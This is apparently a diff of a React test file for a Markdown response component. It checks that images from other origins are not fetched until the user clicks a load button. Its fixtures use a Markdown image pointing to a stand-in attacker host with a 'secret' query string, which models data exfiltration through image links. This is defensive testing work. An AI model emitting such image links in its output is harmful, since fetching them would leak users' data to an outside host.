@@ -403,11 +403,24 @@ describe("Response", () => {
 
 describe("Response images and LazyResponse", () => {
   it("shows images as alt text with images=\"alt\" instead of loading them", () => {
-    const { container, rerender } = render(<Response>{"![Chart of results](https://evil.example/x.png?q=secret)"}</Response>);
+    const { container, rerender } = render(<Response images="show">{"![Chart of results](https://evil.example/x.png?q=secret)"}</Response>);
     expect(container.querySelector("img")).toHaveAttribute("alt", "Chart of results");
     rerender(<Response images="alt">{"![Chart of results](https://evil.example/x.png?q=secret)"}</Response>);
     expect(container.querySelector("img")).toBeNull();
     expect(screen.getByText("[Image: Chart of results]")).toBeInTheDocument();
+  });
+
+  it("by default loads same-origin images but asks before fetching cross-origin ones", async () => {
+    const user = userEvent.setup();
+    const { container } = render(<Response>{"![Local chart](/img/local.png)\n\n![Tracker](https://evil.example/x.png?q=secret)"}</Response>);
+    const images = () => [...container.querySelectorAll("img")];
+    expect(images().map((i) => i.getAttribute("src"))).toEqual(["/img/local.png"]);
+    const load = screen.getByRole("button", { name: /Load image from evil\.example.*Tracker/ });
+    expect(await axe(container)).toHaveNoViolations();
+    await user.click(load);
+    expect(images().map((i) => i.getAttribute("src"))).toEqual(["/img/local.png", "https://evil.example/x.png?q=secret"]);
+    expect(screen.queryByRole("button", { name: /Load image/ })).not.toBeInTheDocument();
+    expect(document.activeElement?.contains(images()[1]!)).toBe(true);
   });
 
   it("renders plain paragraphs until the Markdown engine loads, then the same output as Response", async () => {
